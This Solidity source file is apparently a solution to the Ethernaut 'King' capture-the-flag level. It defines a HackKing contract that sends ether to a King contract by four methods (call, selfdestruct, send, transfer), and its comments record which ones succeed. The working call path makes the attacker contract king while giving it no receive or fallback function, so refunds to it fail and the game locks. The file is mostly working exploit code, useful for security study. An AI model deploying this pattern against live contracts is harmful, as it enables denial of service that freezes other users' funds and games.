// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "./King.sol";
import "hardhat/console.sol";

contract HackKing {
    modifier logGas() {
        uint256 u0 = gasleft();
        _;
        uint256 u1 = gasleft();
        uint256 diff = u0 - u1;
        console.log("Gas spent: ", diff);
    }

    address payable private _kingAddress;

    King _king;

    constructor(address kingAddress) payable {
        _kingAddress = payable(kingAddress);
    }

    // β Works - no available receive or fallback payable function in this contract
    function callValueEther() external payable logGas {
        // π https://docs.soliditylang.org/en/v0.8.15/types.html#members-of-addresses
        // π .gas() - gas limit
        // π .value() - ether amount
        // π return true if succeed - no exceptions are thrown
        (bool success, ) = _kingAddress.call{value: msg.value}("");
        require(success);
    }

    // β Fail
    function selfDestructEther() external payable logGas {
        // π https://docs.soliditylang.org/en/develop/units-and-global-variables.html#contract-related
        // π the receiving contractβs receive function is not executed.
        selfdestruct(_kingAddress);
    }

    // β Fail
    function sendEther() external payable logGas {
        // π https://docs.soliditylang.org/en/v0.8.15/types.html#members-of-addresses
        // π https://docs.soliditylang.org/en/v0.8.15/units-and-global-variables.html#members-of-address-types
        // π https://docs.soliditylang.org/en/v0.8.15/contracts.html#receive-ether-function
        // π 2300 gas limit
        // π return true if succeed - no exceptions are thrown
        require(_kingAddress.send(msg.value));
    }

    // β Fail
    function transferEther() external payable logGas {
        // π https://docs.soliditylang.org/en/v0.8.15/types.html#members-of-addresses
        // π https://docs.soliditylang.org/en/v0.8.15/units-and-global-variables.html#members-of-address-types
        // π https://docs.soliditylang.org/en/v0.8.15/contracts.html#receive-ether-function
        // π 2300 gas limit
        // π throws exception
        _kingAddress.transfer(msg.value);
    }
}
